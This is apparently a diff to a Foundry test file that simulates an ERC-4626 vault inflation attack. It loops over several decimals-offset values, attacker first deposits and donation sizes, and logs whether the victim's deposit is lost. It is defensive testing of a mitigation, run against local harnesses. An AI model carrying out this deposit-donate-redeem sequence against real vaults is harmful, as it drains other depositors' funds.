@@ -13,7 +13,7 @@ import {Rounding, PreUpdateVaultHarness, VaultHarness} from "./harness/Vault.har
 contract VaultTest is Test {
 
     //TODO : add a test to show the recoverd portion by an attacker in a post-update vault if:
-    // offset = 0,4,8, deposit = a0, donation = a1
+    // offset = 0,3,6, deposit = a0, donation = a1
     
     IERC4626 vault;
     IERC4626 preUpdateVault;
@@ -205,54 +205,73 @@ contract VaultTest is Test {
         * same as test_InflationAttack_POSTUpdateVault but looping through an array of values
         * and most of the console.log comments are removed for better readability of results
         */
-		uint256[3] memory attackerFirstDeposit = [uint256(1 wei), uint256(2 wei), uint256(3 wei)];
-		uint256[3] memory attackerInflationTransfer = [uint256(10_000 wei), uint256(10_000 wei), uint256(10_000 wei)];
-		uint256[3] memory victimDeposit = [uint256(10_000 wei), uint256(10_000 wei), uint256(10_000 wei)];
+        uint8[3] memory decimalsOffset = [0, 3, 8];
+
+		uint256[3] memory attackerFirstDeposit = [uint256(1 wei), uint256(100 wei), uint256(1 wei)];
+		uint256[3] memory attackerInflationTransfer = [uint256(1 ether), uint256(1 ether), uint256(10000 ether)];
+		uint256[3] memory victimDeposit = [uint256(1 ether), uint256(1 ether), uint256(1 ether)];
 
         //snapshot capture the state of the blockchain
-        uint256 snapshot = vm.snapshot(); 
+        uint256 snapshot = vm.snapshot();
 
-        for(uint i; i<attackerFirstDeposit.length; i++) {
-            uint8 decimalsOffset = 3;
-            address(vault).call(abi.encodeWithSelector(Vault.setDecimalsOffset.selector, decimalsOffset));
-            console.log("post-update _offsetDecimals(): ", decimalsOffset);
+        for (uint j; j<decimalsOffset.length; j++) { 
+            console.log("\n=============\npost-update _offsetDecimals(): ", decimalsOffset[j]);
+            
+            for(uint i; i<attackerFirstDeposit.length; i++) {        
+                address(vault).call(abi.encodeWithSelector(Vault.setDecimalsOffset.selector, decimalsOffset[j]));
 
-            //from here actions comes from Alice
-            vm.startPrank(alice);
-            underlying.approve(address(vault), attackerFirstDeposit[i]);
-            vault.deposit(attackerFirstDeposit[i], alice);
-            underlying.transfer(address(vault), attackerInflationTransfer[i]);
-            vm.stopPrank();
+                console.log("\n-Attacker First Deposit (a0): ",attackerFirstDeposit[i]);
+                console.log("-attacker Inflation Transfer (a1): ",attackerInflationTransfer[i]);
+                console.log("-Victim Deposit (u): %d\n",victimDeposit[i]);
 
-            //from here actions comes from Bob
-            vm.startPrank(bob);
-            underlying.approve(address(vault), victimDeposit[i]);
-            vault.deposit(victimDeposit[i], bob);
-            vm.stopPrank();
+                uint256 loss = attackerInflationTransfer[i]/(1+attackerFirstDeposit[i]);
+                uint256 victimShares = 10**decimalsOffset[j] *victimDeposit[i];
+                console.log("loss=a1/(1+a0) = ", loss);
+                console.log("10^d * u = ", victimShares);
+                console.log("victim rekt?: ", victimShares < loss);
 
-            console.log("\n-State after the attack-");
-            console.log("Alice's shares:", vault.balanceOf(alice));
-            console.log("Bob's shares:", vault.balanceOf(bob));
-            console.log("total shares in vault:", vault.totalSupply());
-            console.log("total assets in vault:", vault.totalAssets());
+                //from here actions comes from Alice
+                vm.startPrank(alice);
+                underlying.approve(address(vault), attackerFirstDeposit[i]);
+                vault.deposit(attackerFirstDeposit[i], alice);
+                underlying.transfer(address(vault), attackerInflationTransfer[i]);
+                vm.stopPrank();
 
-            uint256 aliceShares = vault.balanceOf(alice);
-            uint256 bobShares = vault.balanceOf(bob);
+                //from here actions comes from Bob
+                vm.startPrank(bob);
+                underlying.approve(address(vault), victimDeposit[i]);
+                vault.deposit(victimDeposit[i], bob);
+                vm.stopPrank();
 
-            vm.prank(alice);
-            uint256 aliceRealRedeem = vault.redeem(aliceShares, alice, alice);
+                console.log("\n-State after the attack-");
+                console.log("Alice's shares:", vault.balanceOf(alice));
+                console.log("Bob's shares:", vault.balanceOf(bob));
+                console.log("total shares in vault:", vault.totalSupply());
+                console.log("total assets in vault:", vault.totalAssets());
 
-            vm.prank(bob);
-            uint256 bobRealRedeem = vault.redeem(bobShares, bob, bob);
+                uint256 aliceShares = vault.balanceOf(alice);
+                uint256 bobShares = vault.balanceOf(bob);
+
+                vm.prank(alice);
+                uint256 aliceRealRedeem = vault.redeem(aliceShares, alice, alice);
+
+                vm.prank(bob);
+                uint256 bobRealRedeem = vault.redeem(bobShares, bob, bob);
 
 
-            console.log("\nAlice gets %d%% back \nBob gets %d%%"
-            , (aliceRealRedeem*100)/(attackerFirstDeposit[i]+attackerInflationTransfer[i])
-            , (bobRealRedeem*100)/(victimDeposit[i])
-            );
+                console.log("\nAlice gets %d%% back (%d) "
+                , (aliceRealRedeem*100)/(attackerFirstDeposit[i]+attackerInflationTransfer[i])
+                , aliceRealRedeem
+                );
 
-            //revertTo revert the state taken at snapshot
-            vm.revertTo(snapshot);
+                console.log("Bob gets %d%% (%d)\n-------------"
+                , (bobRealRedeem*100)/(victimDeposit[i])
+                , bobRealRedeem
+                );
+                //revertTo revert the state taken at snapshot, and save a new one
+                vm.revertTo(snapshot);
+                snapshot = vm.snapshot();
+            }
         }
     }
 
